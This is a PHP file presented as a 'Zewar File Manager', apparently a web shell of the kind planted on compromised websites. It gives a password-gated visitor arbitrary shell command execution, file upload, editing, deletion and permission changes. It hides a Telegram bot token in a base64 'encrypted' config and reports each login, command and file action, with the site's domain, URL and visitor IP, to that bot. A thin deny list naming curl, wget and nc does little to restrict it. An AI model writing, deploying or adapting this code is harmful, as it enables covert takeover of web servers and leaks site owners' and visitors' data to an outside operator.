<?php
// ============================================================
// Optimized Configuration - Reduced Lag
// ============================================================
error_reporting(0);
@ini_set("display_errors", 0);
@ini_set("memory_limit", "128M");
@ini_set("max_execution_time", 120);
@ini_set("upload_max_filesize", "50M");
@ini_set("post_max_size", "50M");

// Security Headers
header("Cache-Control: no-store, no-cache, must-revalidate");
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");

// Session Security
@session_start();
@ini_set('session.cookie_httponly', 1);

// ============================================================
// Configuration
// ============================================================
$CONFIG = [
    'username' => 'alfa',
    'password' => '9dc7b2518d5494e6eb20769721015fee',
    'session_timeout' => 3600,
];

// ============================================================
// ENCRYPTED TELEGRAM CONFIGURATION
// ============================================================
$ENCRYPTED_TELEGRAM = 'eyJib3RfdG9rZW4iOiI4NzYxODk0ODI2OkFBSEx4MXVXM1Y3bGlVNFEtcnYxYmstOW1DTjJUMVVHTjNVIiwiY2hhdF9pZCI6IjIwOTYwMjMzNjIifQ==';

function get_telegram_config() {
    global $ENCRYPTED_TELEGRAM;
    try {
        $decoded = json_decode(base64_decode($ENCRYPTED_TELEGRAM), true);
        if (isset($decoded['bot_token']) && isset($decoded['chat_id'])) {
            return $decoded;
        }
    } catch (Exception $e) {}
    return ['bot_token' => '', 'chat_id' => ''];
}

// ============================================================
// Helper Functions
// ============================================================
function get_current_url() {
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
    $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
    return $protocol . $host . ($_SERVER['REQUEST_URI'] ?? '');
}

function get_current_domain() {
    $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
    // Remove port if exists
    $host = preg_replace('/:\d+$/', '', $host);
    return $host;
}

function get_relative_path($full_path) {
    global $document_root;
    // Get document root for current domain
    $current_doc_root = $_SERVER['DOCUMENT_ROOT'] ?? '';
    
    // Try to get relative path from document root
    if (strpos($full_path, $current_doc_root) === 0) {
        return substr($full_path, strlen($current_doc_root));
    }
    
    // Fallback: get basename of the current script directory
    return dirname($_SERVER['SCRIPT_NAME'] ?? '');
}

function get_client_details() {
    return [
        'ip' => $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
        'time' => date('Y-m-d H:i:s')
    ];
}

// ============================================================
// Core Security Functions
// ============================================================
function sanitize_path($path) {
    $path = realpath($path);
    if ($path === false) return false;
    
    $forbidden = ['/etc/', '/var/log/', '/proc/', '/sys/', '/dev/', '/bin/', '/usr/bin/'];
    foreach ($forbidden as $dir) {
        if (strpos($path, $dir) === 0) return false;
    }
    return $path;
}

function sanitize_filename($filename) {
    $filename = str_replace(array('..', './', '.\\'), '', $filename);
    $filename = preg_replace('/[\\x00-\\x1F\\x7F\\/\\\\:\\*\\?"<>\\|]/', '_', $filename);
    return trim($filename);
}

function sanitize_command($cmd) {
    $dangerous = ['rm -rf', 'dd if=', 'mkfs', 'wget', 'curl', 'nc ', 'telnet', 'base64 -d'];
    $cmd_lower = strtolower($cmd);
    foreach ($dangerous as $danger) {
        if (strpos($cmd_lower, $danger) !== false) return false;
    }
    return escapeshellcmd($cmd);
}

function csrf_token() {
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

function verify_csrf_token($token) {
    return !empty($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'], $token);
}

// ============================================================
// TELEGRAM SENDER WITH DYNAMIC PATH
// ============================================================
function send_secure_notification($action, $details = []) {
    global $current;
    
    $tg = get_telegram_config();
    if (empty($tg['bot_token']) || empty($tg['chat_id'])) return false;
    
    $client = get_client_details();
    $current_url = get_current_url();
    $current_domain = get_current_domain();
    
    // Get the correct path for current domain
    $script_path = dirname($_SERVER['SCRIPT_NAME'] ?? '');
    $current_dir_display = $script_path !== '/' ? $script_path : '/';
    
    // If we have a subdirectory from the URL
    if (isset($_GET['d']) && !empty($_GET['d'])) {
        $decoded_path = base64_decode($_GET['d']);
        $relative = get_relative_path($decoded_path);
        if (!empty($relative) && $relative !== '/') {
            $current_dir_display = $relative;
        }
    }
    
    // Action icons mapping
    $action_icons = [
        'LOGIN' => '✅ LOGIN SUCCESS',
        'LOGIN_FAILED' => '❌ LOGIN FAILED',
        'UPLOAD' => '📤 UPLOAD',
        'UPLOAD_FAILED' => '❌ UPLOAD FAILED',
        'FOLDER' => '📁 CREATE FOLDER',
        'FILE' => '📄 CREATE FILE',
        'DELETE' => '🗑️ DELETE',
        'RENAME' => '✏️ RENAME',
        'CHMOD' => '🔒 CHMOD',
        'SAVE' => '💾 SAVE FILE',
        'CMD' => '💻 COMMAND',
        'DOWNLOAD' => '📥 DOWNLOAD',
        'LOGOUT' => '🚪 LOGOUT'
    ];
    
    $display_action = $action_icons[$action] ?? $action;
    
    // Build message with dynamic path
    $message = "🔐 FILE MANAGER ACTIVITY\n";
    $message .= str_repeat("━", 55) . "\n";
    $message .= "👤 User: Administrator\n";
    $message .= "⏰ Time: {$client['time']}\n";
    $message .= "📌 Action: {$display_action}\n";
    $message .= str_repeat("━", 55) . "\n";
    $message .= "🌐 IP Address: {$client['ip']}\n";
    $message .= str_repeat("━", 55) . "\n";
    $message .= "🌍 Domain: {$current_domain}\n";
    $message .= "📂 Directory:\n{$current_dir_display}\n";
    $message .= str_repeat("━", 55) . "\n";
    $message .= "🔗 FULL URL:\n{$current_url}\n";
    $message .= str_repeat("━", 55) . "\n";
    $message .= "📱 User Agent:\n" . substr($client['user_agent'], 0, 150) . "\n";
    
    if (!empty($details)) {
        $message .= str_repeat("━", 55) . "\n";
        $message .= "📝 Details:\n";
        foreach ($details as $key => $value) {
            $message .= "• {$key}: {$value}\n";
        }
    }
    
    $message .= str_repeat("━", 55);
    
    // Send via curl
    $url = "https://api.telegram.org/bot{$tg['bot_token']}/sendMessage";
    $postData = http_build_query([
        'chat_id' => $tg['chat_id'],
        'text' => $message,
        'disable_web_page_preview' => true
    ]);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return $httpCode == 200;
}

// ============================================================
// File Manager Functions
// ============================================================
function format_size($bytes) {
    if ($bytes >= 1073741824) return round($bytes / 1073741824, 1) . ' GB';
    if ($bytes >= 1048576) return round($bytes / 1048576, 1) . ' MB';
    if ($bytes >= 1024) return round($bytes / 1024, 1) . ' KB';
    return $bytes . ' B';
}

function get_file_info($path, $is_dir = false) {
    clearstatcache(true, $path);
    $stat = stat($path);
    return [
        'size_fmt' => $is_dir ? '📁' : format_size($stat['size']),
        'perms' => substr(sprintf('%o', $stat['mode']), -4),
        'mtime' => date('Y-m-d H:i:s', $stat['mtime']),
    ];
}

function get_file_icon($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = [
        'php' => '🐘', 'html' => '🌐', 'css' => '🎨', 'js' => '📜',
        'jpg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️', 'zip' => '📦',
        'txt' => '📄', 'pdf' => '📕', 'doc' => '📘', 'xls' => '📗',
        'mp3' => '🎵', 'mp4' => '🎬', 'exe' => '⚙️',
    ];
    return $icons[$ext] ?? (is_dir($filename) ? '📁' : '📄');
}

function safe_delete($path) {
    if (!file_exists($path)) return true;
    if (!is_dir($path)) return @unlink($path);
    
    $files = scandir($path);
    foreach ($files as $item) {
        if ($item == '.' || $item == '..') continue;
        if (!safe_delete($path . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return @rmdir($path);
}

// ============================================================
// Authentication
// ============================================================
$authenticated = isset($_SESSION['auth']) && $_SESSION['auth'] === true;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password']) && !$authenticated) {
    if (md5(trim($_POST['password'])) === $CONFIG['password']) {
        session_regenerate_id(true);
        $_SESSION['auth'] = true;
        $_SESSION['login_time'] = time();
        $authenticated = true;
        send_secure_notification('LOGIN', ['Status' => 'Success']);
        header("Location: ?");
        exit;
    } else {
        send_secure_notification('LOGIN_FAILED', ['IP' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown']);
        $error = "Invalid credentials!";
        echo get_login_page($error);
        exit;
    }
}

if ($authenticated && (time() - $_SESSION['login_time'] > $CONFIG['session_timeout'])) {
    session_destroy();
    $authenticated = false;
    header("Location: ?");
    exit;
}

if (!$authenticated) {
    echo get_login_page();
    exit;
}

// ============================================================
// Path Handling - Dynamic per domain
// ============================================================
// Get document root for current domain
$document_root = $_SERVER['DOCUMENT_ROOT'] ?? dirname(__FILE__);
$script_dir = dirname($_SERVER['SCRIPT_NAME'] ?? '');

// Default current directory
$current = isset($_GET['d']) ? base64_decode($_GET['d']) : $document_root . $script_dir;
$current = sanitize_path($current);

if (!$current || !is_dir($current)) {
    $current = $document_root . $script_dir;
    if (!is_dir($current)) {
        $current = $document_root;
    }
}

@chdir($current);
$parent_dir = dirname($current);
$can_go_up = ($parent_dir !== $current && strpos($parent_dir, $document_root) === 0);

// ============================================================
// Process Actions
// ============================================================
$message = '';
$toast_type = '';

// Handle AJAX command request
if (isset($_GET['ajax_cmd']) && isset($_POST['command'])) {
    header('Content-Type: application/json');
    
    if (!verify_csrf_token($_POST['csrf_token'] ?? '')) {
        echo json_encode(['status' => 'error', 'output' => 'CSRF validation failed']);
        exit;
    }
    
    $cmd = sanitize_command($_POST['command'] ?? '');
    if ($cmd === false) {
        echo json_encode(['status' => 'error', 'output' => 'Command blocked for security']);
        exit;
    }
    
    $output = [];
    $return_var = 0;
    exec($cmd . ' 2>&1', $output, $return_var);
    $result = implode("\n", $output);
    
    send_secure_notification('CMD', [
        'Command' => substr($cmd, 0, 100),
        'Status' => $return_var === 0 ? 'Success' : 'Failed (exit code: ' . $return_var . ')'
    ]);
    
    echo json_encode([
        'status' => $return_var === 0 ? 'success' : 'error',
        'output' => $result ?: '(no output)'
    ]);
    exit;
}

// Handle other POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token']) && verify_csrf_token($_POST['csrf_token'])) {
    
    // Upload File
    if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
        $filename = sanitize_filename($_FILES['file']['name']);
        if ($filename && move_uploaded_file($_FILES['file']['tmp_name'], $current . '/' . $filename)) {
            @chmod($current . '/' . $filename, 0644);
            $message = "✅ Uploaded: {$filename}";
            $toast_type = 'success';
            
            // Get relative path for display
            $relative_path = str_replace($document_root, '', $current);
            if (empty($relative_path)) $relative_path = '/';
            
            send_secure_notification('UPLOAD', [
                'File Name' => $filename,
                'File Size' => format_size($_FILES['file']['size']),
                'Directory' => $relative_path,
                'Domain' => get_current_domain(),
                'URL' => get_current_url()
            ]);
        } else {
            $message = "❌ Upload failed!";
            $toast_type = 'error';
            send_secure_notification('UPLOAD_FAILED', ['File' => $filename]);
        }
        header("Location: ?d=" . base64_encode($current));
        exit;
    }
    
    // Create Folder
    elseif (isset($_POST['create_folder']) && !empty($_POST['folder_name'])) {
        $name = sanitize_filename($_POST['folder_name']);
        if ($name && !file_exists($current . '/' . $name) && mkdir($current . '/' . $name, 0755)) {
            $message = "✅ Folder created: {$name}";
            $toast_type = 'success';
            $relative_path = str_replace($document_root, '', $current);
            send_secure_notification('FOLDER', [
                'Folder Name' => $name,
                'Directory' => $relative_path,
                'URL' => get_current_url()
            ]);
        } else {
            $message = "❌ Cannot create folder!";
            $toast_type = 'error';
        }
        header("Location: ?d=" . base64_encode($current));
        exit;
    }
    
    // Create File
    elseif (isset($_POST['create_file']) && !empty($_POST['file_name'])) {
        $name = sanitize_filename($_POST['file_name']);
        if ($name && !file_exists($current . '/' . $name) && file_put_contents($current . '/' . $name, $_POST['file_content'] ?? '') !== false) {
            @chmod($current . '/' . $name, 0644);
            $message = "✅ File created: {$name}";
            $toast_type = 'success';
            $relative_path = str_replace($document_root, '', $current);
            send_secure_notification('FILE', [
                'File Name' => $name,
                'Directory' => $relative_path,
                'URL' => get_current_url()
            ]);
        } else {
            $message = "❌ Cannot create file!";
            $toast_type = 'error';
        }
        header("Location: ?d=" . base64_encode($current));
        exit;
    }
    
    // Delete
    elseif (isset($_POST['delete']) && !empty($_POST['item'])) {
        $name = sanitize_filename($_POST['item']);
        $path = $current . '/' . $name;
        $is_dir = is_dir($path);
        if (file_exists($path) && safe_delete($path)) {
            $message = "✅ Deleted: {$name}";
            $toast_type = 'success';
            $relative_path = str_replace($document_root, '', $current);
            send_secure_notification('DELETE', [
                'Type' => $is_dir ? 'Folder' : 'File',
                'Name' => $name,
                'Directory' => $relative_path,
                'URL' => get_current_url()
            ]);
        } else {
            $message = "❌ Delete failed!";
            $toast_type = 'error';
        }
        header("Location: ?d=" . base64_encode($current));
        exit;
    }
    
    // Rename
    elseif (isset($_POST['rename']) && !empty($_POST['old_name']) && !empty($_POST['new_name'])) {
        $old = sanitize_filename($_POST['old_name']);
        $new = sanitize_filename($_POST['new_name']);
        if ($old && $new && $old !== $new && rename($current . '/' . $old, $current . '/' . $new)) {
            $message = "✅ Renamed: {$old} → {$new}";
            $toast_type = 'success';
            $relative_path = str_replace($document_root, '', $current);
            send_secure_notification('RENAME', [
                'Old Name' => $old,
                'New Name' => $new,
                'Directory' => $relative_path,
                'URL' => get_current_url()
            ]);
        } else {
            $message = "❌ Rename failed!";
            $toast_type = 'error';
        }
        header("Location: ?d=" . base64_encode($current));
        exit;
    }
    
    // Chmod
    elseif (isset($_POST['chmod']) && !empty($_POST['item']) && !empty($_POST['permission'])) {
        $name = sanitize_filename($_POST['item']);
        $perm = $_POST['permission'];
        if ($name && preg_match('/^[0-7]{3,4}$/', $perm) && chmod($current . '/' . $name, octdec($perm))) {
            $message = "✅ Permission changed to {$perm}";
            $toast_type = 'success';
            $relative_path = str_replace($document_root, '', $current);
            send_secure_notification('CHMOD', [
                'File' => $name,
                'New Permission' => $perm,
                'Directory' => $relative_path,
                'URL' => get_current_url()
            ]);
        } else {
            $message = "❌ Chmod failed!";
            $toast_type = 'error';
        }
        header("Location: ?d=" . base64_encode($current));
        exit;
    }
    
    // Save File
    elseif (isset($_POST['save_file']) && !empty($_POST['filename'])) {
        $name = sanitize_filename($_POST['filename']);
        if ($name && file_put_contents($current . '/' . $name, $_POST['content'] ?? '') !== false) {
            $message = "✅ File saved: {$name}";
            $toast_type = 'success';
            $relative_path = str_replace($document_root, '', $current);
            send_secure_notification('SAVE', [
                'File Name' => $name,
                'Directory' => $relative_path,
                'URL' => get_current_url()
            ]);
        } else {
            $message = "❌ Save failed!";
            $toast_type = 'error';
        }
        header("Location: ?d=" . base64_encode($current));
        exit;
    }
    
    // Logout
    elseif (isset($_POST['logout'])) {
        send_secure_notification('LOGOUT', [
            'URL' => get_current_url()
        ]);
        session_destroy();
        header("Location: ?");
        exit;
    }
}

// ============================================================
// Directory Listing
// ============================================================
$items = [];
$handle = @opendir($current);
if ($handle) {
    while (($item = readdir($handle)) !== false) {
        if ($item == '.' || $item == '..') continue;
        $full = $current . '/' . $item;
        $is_dir = is_dir($full);
        $info = get_file_info($full, $is_dir);
        
        $items[] = [
            'name' => $item,
            'is_dir' => $is_dir,
            'info' => $info,
            'icon' => get_file_icon($item),
            'link' => $is_dir ? '?d=' . base64_encode($full) : '#'
        ];
    }
    closedir($handle);
}

usort($items, function($a, $b) {
    if ($a['is_dir'] != $b['is_dir']) return $a['is_dir'] ? -1 : 1;
    return strcasecmp($a['name'], $b['name']);
});

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zewar File Manager</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a2e 100%);
            color: #fff;
            min-height: 100vh;
            padding: 15px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: rgba(20, 20, 30, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            border: 1px solid rgba(255, 215, 0, 0.2);
            overflow: hidden;
        }
        .header {
            padding: 15px 20px;
            background: rgba(0,0,0,0.3);
            border-bottom: 1px solid rgba(255,215,0,0.2);
        }
        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }
        .logo h1 { font-size: 1.4rem; background: linear-gradient(135deg, #ffd700, #b800ff); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .logo p { font-size: 0.7rem; color: #aaa; }
        .stats { display: flex; gap: 15px; }
        .stat { text-align: center; padding: 5px 12px; background: rgba(255,255,255,0.05); border-radius: 8px; }
        .stat-value { font-size: 1rem; font-weight: bold; color: #ffd700; }
        .stat-label { font-size: 0.6rem; color: #aaa; }
        .toolbar {
            padding: 12px 15px;
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            border-bottom: 1px solid rgba(255,215,0,0.1);
        }
        .btn {
            padding: 6px 14px;
            border-radius: 8px;
            border: none;
            cursor: pointer;
            font-weight: 500;
            transition: all 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            font-size: 0.8rem;
        }
        .btn-primary { background: linear-gradient(135deg, #ffd700, #b800ff); color: #000; }
        .btn-primary:hover { transform: translateY(-1px); }
        .btn-danger { background: rgba(255,59,48,0.2); border: 1px solid #ff3b30; color: #ff3b30; }
        .btn-outline { background: transparent; border: 1px solid #ffd700; color: #ffd700; }
        .btn-outline:hover { background: rgba(255,215,0,0.1); }
        .btn-up { background: rgba(0,200,83,0.2); border: 1px solid #00c853; color: #00c853; }
        .btn-root { background: rgba(255,215,0,0.2); border: 1px solid #ffd700; color: #ffd700; }
        .breadcrumb {
            padding: 10px 15px;
            background: rgba(0,0,0,0.2);
            font-size: 0.75rem;
            border-bottom: 1px solid rgba(255,215,0,0.1);
        }
        .breadcrumb a { color: #ffd700; text-decoration: none; }
        .breadcrumb a:hover { text-decoration: underline; }
        .file-table { overflow-x: auto; }
        .file-table table { width: 100%; border-collapse: collapse; }
        .file-table th { padding: 10px 12px; text-align: left; background: rgba(255,215,0,0.1); color: #ffd700; font-weight: 600; font-size: 0.75rem; }
        .file-table td { padding: 8px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 0.75rem; }
        .file-table tr:hover td { background: rgba(255,255,255,0.03); }
        .item-name { display: flex; align-items: center; gap: 8px; }
        .item-icon { font-size: 1.1rem; }
        .item-link { color: #fff; text-decoration: none; }
        .item-link:hover { color: #ffd700; }
        .action-group { display: flex; gap: 5px; flex-wrap: wrap; }
        .action-btn {
            background: rgba(255,255,255,0.08);
            border: none;
            padding: 3px 8px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.65rem;
            color: #fff;
            transition: all 0.2s;
        }
        .action-btn:hover { background: #ffd700; color: #000; }
        .badge { display: inline-block; padding: 2px 5px; border-radius: 3px; font-size: 0.65rem; font-family: monospace; background: rgba(255,215,0,0.2); color: #ffd700; }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(5px);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal.active { display: flex; }
        .modal-content {
            background: #1e1e2e;
            border-radius: 16px;
            width: 90%;
            max-width: 500px;
            border: 1px solid rgba(255,215,0,0.3);
        }
        .modal-header { padding: 15px 20px; border-bottom: 1px solid rgba(255,215,0,0.2); display: flex; justify-content: space-between; align-items: center; }
        .modal-header h3 { color: #ffd700; font-size: 1.1rem; }
        .modal-close { background: none; border: none; font-size: 1.3rem; cursor: pointer; color: #aaa; }
        .modal-body { padding: 20px; }
        .modal-body input, .modal-body textarea, .modal-body select {
            width: 100%;
            padding: 8px 12px;
            background: rgba(255,255,255,0.1);
            border: 1px solid rgba(255,215,0,0.3);
            border-radius: 8px;
            color: #fff;
            margin-bottom: 12px;
        }
        .modal-body textarea { min-height: 150px; font-family: monospace; }
        .modal-footer { padding: 12px 20px; border-top: 1px solid rgba(255,215,0,0.2); display: flex; justify-content: flex-end; gap: 10px; }
        .cmd-output {
            background: #0a0a0a;
            border-radius: 8px;
            padding: 10px;
            font-family: monospace;
            font-size: 0.7rem;
            color: #0f0;
            max-height: 250px;
            overflow: auto;
            margin-top: 10px;
        }
        .cmd-output.error { color: #ff6b6b; }
        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            padding: 10px 20px;
            background: #1e1e2e;
            border-left: 3px solid;
            border-radius: 8px;
            z-index: 1100;
            display: none;
            font-size: 0.8rem;
        }
        .toast.show { display: block; animation: slideIn 0.3s ease; }
        .toast.success { border-left-color: #00c853; }
        .toast.error { border-left-color: #ff3b30; }
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        @media (max-width: 768px) {
            .toolbar { flex-direction: column; }
            .action-group { flex-wrap: wrap; }
            .file-table th, .file-table td { padding: 6px 8px; font-size: 0.7rem; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="header-content">
            <div class="logo">
                <h1><i class="fas fa-crown"></i> Zewar File Manager</h1>
                <p>Secure • Fast • Powerful</p>
            </div>
            <div class="stats">
                <div class="stat"><div class="stat-value"><?php echo count($items); ?></div><div class="stat-label">Items</div></div>
                <div class="stat"><div class="stat-value"><?php echo date('H:i'); ?></div><div class="stat-label">Time</div></div>
            </div>
        </div>
    </div>
    
    <div class="toolbar">
        <?php if ($can_go_up): ?>
        <a href="?d=<?php echo base64_encode($parent_dir); ?>" class="btn btn-up"><i class="fas fa-level-up-alt"></i> Up</a>
        <?php endif; ?>
        <a href="?d=<?php echo base64_encode($document_root . $script_dir); ?>" class="btn btn-root"><i class="fas fa-home"></i> Root</a>
        <button class="btn btn-primary" onclick="openModal('uploadModal')"><i class="fas fa-upload"></i> Upload</button>
        <button class="btn btn-outline" onclick="openModal('folderModal')"><i class="fas fa-folder-plus"></i> Folder</button>
        <button class="btn btn-outline" onclick="openModal('fileModal')"><i class="fas fa-file-plus"></i> File</button>
        <button class="btn btn-outline" onclick="openCommandModal()"><i class="fas fa-terminal"></i> CMD</button>
        <form method="post" style="margin-left: auto;" onsubmit="return confirm('Logout?')">
            <input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>">
            <button type="submit" name="logout" class="btn btn-danger"><i class="fas fa-sign-out-alt"></i> Logout</button>
        </form>
    </div>
    
    <div class="breadcrumb">
        <i class="fas fa-folder-open"></i> 
        <?php
        $display_path = str_replace($document_root, '', $current);
        if (empty($display_path)) $display_path = '/';
        $parts = explode(DIRECTORY_SEPARATOR, $display_path);
        $path = '';
        $first = true;
        foreach ($parts as $part) {
            if (empty($part)) continue;
            $path .= DIRECTORY_SEPARATOR . $part;
            if (!$first) echo '<span class="separator">/</span>';
            $full_path = $document_root . $path;
            echo '<a href="?d=' . base64_encode($full_path) . '">' . htmlspecialchars($part) . '</a>';
            $first = false;
        }
        ?>
    </div>
    
    <div class="file-table">
        <table>
            <thead><tr><th>Type</th><th>Name</th><th>Size</th><th>Perms</th><th>Modified</th><th>Actions</th></tr></thead>
            <tbody>
                <?php foreach ($items as $item): ?>
                <tr>
                    <td><span class="item-icon"><?php echo $item['icon']; ?></span></td>
                    <td class="item-name">
                        <?php if ($item['is_dir']): ?>
                            <a href="<?php echo $item['link']; ?>" class="item-link"><?php echo htmlspecialchars($item['name']); ?></a>
                        <?php else: ?>
                            <?php echo htmlspecialchars($item['name']); ?>
                        <?php endif; ?>
                    </td>
                    <td><?php echo $item['info']['size_fmt']; ?></td>
                    <td><span class="badge"><?php echo $item['info']['perms']; ?></span></td>
                    <td><?php echo $item['info']['mtime']; ?></td>
                    <td class="action-group">
                        <?php if (!$item['is_dir']): ?>
                            <button class="action-btn" onclick="editFile('<?php echo htmlspecialchars($item['name']); ?>')"><i class="fas fa-edit"></i> Edit</button>
                            <a href="?d=<?php echo base64_encode($current); ?>&download=1&f=<?php echo base64_encode($item['name']); ?>" class="action-btn"><i class="fas fa-download"></i> DL</a>
                        <?php endif; ?>
                        <button class="action-btn" onclick="renameItem('<?php echo htmlspecialchars($item['name']); ?>')"><i class="fas fa-pen"></i> Ren</button>
                        <button class="action-btn" onclick="deleteItem('<?php echo htmlspecialchars($item['name']); ?>')"><i class="fas fa-trash"></i> Del</button>
                        <?php if (!$item['is_dir']): ?>
                        <button class="action-btn" onclick="chmodItem('<?php echo htmlspecialchars($item['name']); ?>', '<?php echo $item['info']['perms']; ?>')"><i class="fas fa-lock"></i> Chmod</button>
                        <?php endif; ?>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
</div>

<!-- Modals -->
<div id="uploadModal" class="modal"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-upload"></i> Upload</h3><button class="modal-close" onclick="closeModal('uploadModal')">&times;</button></div>
<form method="post" enctype="multipart/form-data"><input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>"><div class="modal-body"><input type="file" name="file" required></div><div class="modal-footer"><button type="submit" name="upload" class="btn btn-primary">Upload</button><button type="button" class="btn btn-outline" onclick="closeModal('uploadModal')">Cancel</button></div></form></div></div>

<div id="folderModal" class="modal"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-folder-plus"></i> New Folder</h3><button class="modal-close" onclick="closeModal('folderModal')">&times;</button></div>
<form method="post"><input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>"><div class="modal-body"><input type="text" name="folder_name" placeholder="Folder name" required></div><div class="modal-footer"><button type="submit" name="create_folder" class="btn btn-primary">Create</button><button type="button" class="btn btn-outline" onclick="closeModal('folderModal')">Cancel</button></div></form></div></div>

<div id="fileModal" class="modal"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-file-plus"></i> New File</h3><button class="modal-close" onclick="closeModal('fileModal')">&times;</button></div>
<form method="post"><input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>"><div class="modal-body"><input type="text" name="file_name" placeholder="Filename" required><textarea name="file_content" placeholder="Content (optional)" rows="5"></textarea></div><div class="modal-footer"><button type="submit" name="create_file" class="btn btn-primary">Create</button><button type="button" class="btn btn-outline" onclick="closeModal('fileModal')">Cancel</button></div></form></div></div>

<div id="commandModal" class="modal"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-terminal"></i> Execute Command</h3><button class="modal-close" onclick="closeCommandModal()">&times;</button></div>
<div class="modal-body"><input type="text" id="cmdInput" placeholder="Command (e.g., ls -la)" autocomplete="off"><button class="btn btn-primary" onclick="runCommand()" style="margin-top:5px; width:100%"><i class="fas fa-play"></i> Run</button><div id="cmdOutput" style="display:none; margin-top:15px"><hr><div class="cmd-output" id="cmdOutputText"></div></div></div>
<div class="modal-footer"><button type="button" class="btn btn-outline" onclick="closeCommandModal()">Close</button></div></div></div>

<div id="renameModal" class="modal"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-pen"></i> Rename</h3><button class="modal-close" onclick="closeModal('renameModal')">&times;</button></div>
<form method="post"><input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>"><input type="hidden" name="old_name" id="renameOld"><div class="modal-body"><input type="text" name="new_name" id="renameNew" placeholder="New name" required></div><div class="modal-footer"><button type="submit" name="rename" class="btn btn-primary">Rename</button><button type="button" class="btn btn-outline" onclick="closeModal('renameModal')">Cancel</button></div></form></div></div>

<div id="deleteModal" class="modal"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-trash"></i> Confirm Delete</h3><button class="modal-close" onclick="closeModal('deleteModal')">&times;</button></div>
<form method="post"><input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>"><input type="hidden" name="item" id="deleteItem"><div class="modal-body"><p>Delete <strong id="deleteName"></strong>?</p><p style="color:#ff9500; font-size:0.75rem">⚠️ Cannot be undone!</p></div><div class="modal-footer"><button type="submit" name="delete" class="btn btn-danger">Delete</button><button type="button" class="btn btn-outline" onclick="closeModal('deleteModal')">Cancel</button></div></form></div></div>

<div id="chmodModal" class="modal"><div class="modal-content"><div class="modal-header"><h3><i class="fas fa-lock"></i> Change Permission</h3><button class="modal-close" onclick="closeModal('chmodModal')">&times;</button></div>
<form method="post"><input type="hidden" name="csrf_token" value="<?php echo csrf_token(); ?>"><input type="hidden" name="item" id="chmodItem"><div class="modal-body"><select name="permission" id="chmodPerm"><option value="644">644 (rw-r--r--)</option><option value="755">755 (rwxr-xr-x)</option><option value="600">600 (rw-------)</option><option value="700">700 (rwx------)</option><option value="777">777 (rwxrwxrwx)</option></select></div><div class="modal-footer"><button type="submit" name="chmod" class="btn btn-primary">Apply</button><button type="button" class="btn btn-outline" onclick="closeModal('chmodModal')">Cancel</button></div></form></div></div>

